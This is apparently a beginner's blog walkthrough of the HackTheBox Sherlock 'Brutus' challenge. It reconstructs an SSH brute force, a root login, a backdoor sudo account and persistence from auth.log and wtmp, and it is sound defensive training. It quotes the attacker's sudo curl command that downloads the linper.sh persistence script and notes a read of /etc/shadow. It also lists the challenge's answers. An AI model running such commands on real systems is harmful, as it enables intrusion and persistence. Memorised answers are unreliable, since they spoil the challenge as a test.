---
title: "Brutus – HackTheBox / Sherlocks"
date: 2026-05-09
categories: [HackTheBox, Sherlocks]
tags: [forensics, brute-force, auth-log, wtmp, ssh]
---

Learning cybersecurity can be tricky, but CTF (Capture the Flag) challenges make it much easier by letting you practice in a safe environment that feels like the real thing. One of these challenges is called **Brutus**, found on HackTheBox. It sits in the **Sherlock** category and is rated *very easy*, making it perfect for beginners.

In this challenge you are given two files to work with. The first is *auth.log*, a plain text file that records every login attempt, session event, and sudo command on the system — essentially a timeline of everything that happened. The second is *wtmp*, a binary file that tracks user sessions and cannot be read directly like a text file. To make sense of it, we use *utmpdump*, a standard Linux tool from the `util-linux` package that converts the binary content into a human-readable format. Together these two files give us everything we need to reconstruct the attacker's actions from start to finish.

## Preparation

**Step 1** — Download `Brutus.zip` from HackTheBox. Before extracting, preview its contents:

```bash
unzip -l Brutus.zip
```

![Brutus.zip contents](/assets/img/posts/brutus/picture1.png)
_Picture 1: Brutus.zip contents — auth.log and wtmp listed_

**Step 2** — Extract the archive using *7-Zip* with the password found on the HackTheBox website:

```bash
7z x Brutus.zip
```

![Brutus.zip extracted using 7-Zip](/assets/img/posts/brutus/picture2.png)
_Picture 2: Brutus.zip extracted using 7-Zip_

**Step 3** — Before diving in, confirm the file types. *auth.log* is plain text (usable with `grep` and `awk`), while *wtmp* is binary and needs `utmpdump`:

```bash
file auth.log wtmp
```

![file command output](/assets/img/posts/brutus/picture3.png)
_Picture 3: auth.log identified as ASCII text, wtmp identified as binary data — confirming which tool to use for each file_

## Analysis

### Task 1: Analyzing *auth.log*, can you identify the IP address used by the attacker to carry out a brute force attack?

A repeated IP in failed login entries alone is a weak indicator — a legitimate user could simply be mistyping their password. The indicator gains weight when combined with two additional factors: the volume (210 failed attempts from `65.2.161.68`) and the timeframe (~19 attempts per second over 11 seconds). Individually, each factor is a weak indicator. However, when correlated — a single source IP, a high volume of failed attempts (210), and a rapid request rate (~19 attempts per second) — these indicators collectively suggest activity consistent with automated tooling rather than normal user behavior.

```bash
grep "Failed password" auth.log \
  | grep -oE 'from [0-9.]+' \
  | awk '{print $2}' \
  | sort \
  | uniq -c \
  | sort -rn
```

The result shows a notable outlier — `65.2.161.68` accounts for 210 failed login attempts within 11 seconds. At approximately 19 requests per second, that rate is not consistent with manual input, which further supports the indication of automated tooling.

![Failed login counts by source IP](/assets/img/posts/brutus/picture4.png)
_Picture 4: 65.2.161.68 responsible for 210 failed login attempts — highest count indicates brute force origin_

> **Answer:** `65.2.161.68`
{: .prompt-info }

### Task 2: The brute force attempts were successful and the attacker gained access to an account on the server. What is the username of this account?

To identify successful logins, filter the log for accepted password events:

```bash
grep "Accepted password" auth.log
```

The output shows four accepted password events — three for `root` and one for `cyberjunkie` — all originating from `65.2.161.68`. The first accepted root login appears at **06:31:40**, but if you look closely at line 294 in `auth.log`, that session disconnects within the same second. This is unlikely to represent an interactive user session; it is consistent with a brute-force tool validating credentials before disconnecting. The actual interactive root session, where a human came back to use the password, opens later at **06:32:44**.

![Accepted password events](/assets/img/posts/brutus/picture5.png)
_Picture 5: First successful root authentication at 06:32:44; the 06:31:40 hit is the brute-force tool's validation drop, not an interactive session_

> **Answer:** `root`
{: .prompt-info }

### Task 3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session. The login time will be different from the authentication time and can be found in the wtmp artifact.

This task asks specifically for the *wtmp* value, not the *auth.log* value, and for good reason. `auth.log` records the moment `sshd` accepted the password. `wtmp` records when the terminal was actually allocated to the user. These two events are one second apart — `06:32:44` in auth.log vs `06:32:45` in wtmp — and that gap is exactly why forensic analysts check both sources. Use `utmpdump` to read the binary `wtmp` file:

```bash
utmpdump wtmp
```

![utmpdump output of wtmp](/assets/img/posts/brutus/picture6.png)
_Picture 6: wtmp parsed via utmpdump — root session opened from 65.2.161.68 at 06:32:45_

> **Answer:** `2024-03-06 06:32:45`
{: .prompt-info }

### Task 4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the root account?

Once the attacker's interactive session started, the operating system assigned it a session number. The specific line to look for is logged by `systemd-logind`:

```text
systemd-logind[411]: New session 37 of user root
```

That tells you both the source process and the session number — useful for correlating events across log files in future investigations.

![systemd-logind session 37 entry](/assets/img/posts/brutus/picture7.png)
_Picture 7: Root session 37 opened at 06:32:44 following successful password authentication from 65.2.161.68_

> **Answer:** `37`
{: .prompt-info }

### Task 5: The attacker added a new user as part of their persistence strategy and gave this new account higher privileges. What is the name of this account?

Search for user management events in `auth.log`:

```bash
grep -E "useradd|usermod|groupadd" auth.log
```

At **06:34:18** a new group and user called `cyberjunkie` were created. At **06:35:15** that user was added to the `sudo` group, granting full administrative privileges.

![cyberjunkie account creation and sudo escalation](/assets/img/posts/brutus/picture8.png)
_Picture 8: Backdoor account cyberjunkie created at 06:34:18 — added to sudo group at 06:35:15_

> **Answer:** `cyberjunkie`
{: .prompt-info }

### Task 6: What is the MITRE ATT&CK sub-technique ID used for persistence?

Navigate to **attack.mitre.org → Enterprise Matrix → Persistence → Create Account → Local Account** to find the correct sub-technique ID for creating a local user as a persistence mechanism.

![MITRE ATT&CK T1136.001 page](/assets/img/posts/brutus/picture9.png)
_Picture 9: MITRE ATT&CK T1136.001 — Local Account creation technique identified_

> **Answer:** `T1136.001`
{: .prompt-info }

### Task 7: What time did the attacker's first SSH session end according to auth.log?

The session started at **06:32:45**. At **06:37:24** the connection ends — and if you look at the screenshot carefully, the full session teardown sequence is logged at 06:37:24, ending with `Removed session 37`.

![Session teardown at 06:37:24](/assets/img/posts/brutus/picture10.png)
_Picture 10: Attacker session disconnect and logout from root at 06:37:24_

> **Answer:** `2024-03-06 06:37:24`
{: .prompt-info }

### Task 8: The attacker logged into their backdoor account and used elevated privileges to download a script. What is the full command executed using sudo?

At **06:37:34** a new session was created for `cyberjunkie`. Filter for sudo activity to see what commands they ran with elevated privileges:

```bash
grep "sudo:" auth.log | grep COMMAND
```

The output shows that at **06:39:38** they downloaded an external script using `curl`.

![sudo COMMAND entries for cyberjunkie](/assets/img/posts/brutus/picture11.png)
_Picture 11: Cyberjunkie executes privileged commands via sudo — reading /etc/shadow and downloading a script_

> **Answer:**
>
> ```bash
> /usr/bin/curl \
>   https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
> ```
{: .prompt-info }

## Conclusion

This was my first HackTheBox Sherlock challenge, and I was surprised by how much you can learn from a single simple task. Analyzing the `auth.log` and `wtmp` files showed me how you can trace every step an attacker takes — from brute-force attempts all the way to creating a backdoor account and downloading scripts.

The most important takeaway for me was that system logs provide a reliable record of system activity, which can be used to reconstruct attacker behavior. When someone breaks into a system, they almost always leave a trace, and our job is to find it.

If you are just getting started with cybersecurity, **Brutus** is a perfect starting point — not too difficult, but it gives you the feeling that you are doing something real.
